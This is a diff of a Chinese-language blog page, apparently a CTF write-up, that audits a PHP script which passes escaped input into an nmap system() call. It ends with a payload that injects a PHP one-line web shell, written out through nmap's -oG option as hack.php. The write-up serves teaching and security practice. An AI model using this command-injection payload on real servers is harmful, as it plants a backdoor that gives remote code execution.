@@ -132,9 +132,14 @@ SameSite：如果为None，可能可用于CSRF攻击。
 </blockquote>
 <p>创建实例显示源代码如下：  </p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>进行代码审计，我们发现<br>只要传入host参数，就会进入else逻辑<br>其中存在mkdir命令和chdir命令。</p>
-<p>mkdir命令是确保sandbox存在，不存在就创建一个<br>chair命令是进入到sandbox目录去</p>
-<p><em>$sandbox &#x3D; md5(“glzjin”. $_SERVER[‘REMOTE_ADDR’]);<em>会将</em>glzjin</em>与<em>REMOTE_ADDR</em>中存储的数据进行MD5运算<br>注意到最后一行中出现system()函数进行命令执行，因此我们可以尝试依次作为我们RCE的入手点。<br>其中的 <em>nmap -T5 -sT -Pn –host-timeout 2 -F</em>命令是对$host指定的主机的端口进行扫描</p>
+<p>进行代码审计，我们发现</p>
+<p>只要传入host参数，就会进入else逻辑<br>,其中存在mkdir命令和chdir命令。</p>
+<pre><code>mkdir命令是确保sandbox存在，不存在就创建一个
+chair命令是进入到sandbox目录去
+</code></pre>
+<p><em>$sandbox &#x3D; md5(“glzjin”. $_SERVER[‘REMOTE_ADDR’]);<em>会将</em>glzjin</em>与<em>REMOTE_ADDR</em>中存储的数据进行MD5运算</p>
+<p>注意到最后一行中出现system()函数进行命令执行，因此我们可以尝试依次作为我们RCE的入手点。 </p>
+<p>其中的 <em>nmap -T5 -sT -Pn –host-timeout 2 -F</em>命令是对$host指定的主机的端口进行扫描</p>
 <p>接下来看看从哪里触发system()函数</p>
 <p>注意到程序中存在escapehsellarg()函数和escapeshellcmd()函数，看看他们可以实现什么样的功能？</p>
 <blockquote>
@@ -160,7 +165,8 @@ SameSite：如果为None，可能可用于CSRF攻击。
 <pre><code>escapeshellarg()
 escapeshellcmd()
 </code></pre>
-<p>的形式，反而会导致进一步的RCE漏洞。<br>因此我们可以从这里入手，从而利用system()函数得到flag<br>我们使用上传一句话木马来连接服务器</p>
+<p>的形式，反而会导致进一步的RCE漏洞。<br>因此我们可以从这里入手，从而利用system()函数得到flag</p>
+<p>我们使用上传一句话木马的方式来RCE</p>
 <p>payload：</p>
 <pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;
 </code></pre>
